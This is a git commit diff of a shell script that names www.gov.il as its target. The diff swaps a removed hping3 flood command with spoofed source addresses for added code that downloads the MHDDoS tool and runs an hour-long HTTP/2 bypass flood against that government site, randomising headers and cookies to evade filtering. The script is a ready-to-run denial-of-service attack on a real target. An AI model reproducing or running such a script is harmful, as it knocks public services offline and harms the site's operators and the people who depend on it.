49cccd83b20c68686c5dd6af8d8200affb0410d5
mmtmmaf <mmtmmaf@gmail.com>
2025-07-28 00:45:02 +0300

    Add files via upload

--- task.sh
+++ task.sh
@@ -3,9 +3,18 @@
 target_host="www.gov.il"
 target_port="443"
 
-apt update && apt upgrade -y
+apt -y update && apt -y upgrade
 pip install --upgrade pip
 
-sudo apt install hping3 -y
+task(){
+  apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git
+  
+  git clone "https://github.com/MatrixTM/MHDDoS.git"
+  cd "MHDDoS"
+  pip install -r "requirements.txt"
+  sleep 10
+  python3 start.py $target_host BYPASS 5000 3600 none none 0 256 --useragent-random --referer-random --cookie-random --host-random --delay 10 --http2
 
-hping3 -S $target_host -p $target_port -c 1000 -i u100 --flood -d 120 -f --icmp --listen --rand-source --scan 1-1000
+}
+
+task
